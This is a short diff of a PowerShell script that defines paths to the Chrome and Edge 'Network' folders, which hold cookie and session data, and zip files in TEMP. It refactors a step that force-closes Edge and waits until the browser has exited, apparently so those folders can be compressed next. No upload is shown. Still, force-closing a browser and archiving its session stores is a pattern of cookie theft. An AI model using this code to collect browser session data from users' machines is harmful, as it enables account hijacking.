@@ -9,19 +9,24 @@ $edgeNetworkFolder = "C:\Users\$currentUser\AppData\Local\Microsoft\Edge\User Da
 $chromeZip = "$env:TEMP\ChromeNetwork.zip"
 $edgeZip = "$env:TEMP\EdgeNetwork.zip"
 
-# Function to check if a process is running
-function Is-ProcessRunning {
-    param (
-        [string]$processName
-    )
-    return Get-Process -Name $processName -ErrorAction SilentlyContinue
+# Function to close Edge if it is running
+function Close-Edge {
+    $edgeProcesses = Get-Process -Name "msedge" -ErrorAction SilentlyContinue
+    if ($edgeProcesses) {
+        Write-Host "Closing Microsoft Edge..."
+        Stop-Process -Name "msedge" -Force -ErrorAction SilentlyContinue
+        Start-Sleep -Seconds 5 # Wait for Edge to close
+    }
 }
 
 # Close Edge if it's running
-if (Is-ProcessRunning "msedge") {
-    Write-Host "Closing Microsoft Edge..."
-    Stop-Process -Name "msedge" -Force
-    Start-Sleep -Seconds 5 # Wait for a moment to ensure the process is closed
+Close-Edge
+
+# Wait until Edge is fully closed before proceeding
+$edgeProcesses = Get-Process -Name "msedge" -ErrorAction SilentlyContinue
+while ($edgeProcesses) {
+    Start-Sleep -Seconds 1
+    $edgeProcesses = Get-Process -Name "msedge" -ErrorAction SilentlyContinue
 }
 
 # Compress the Chrome network folder
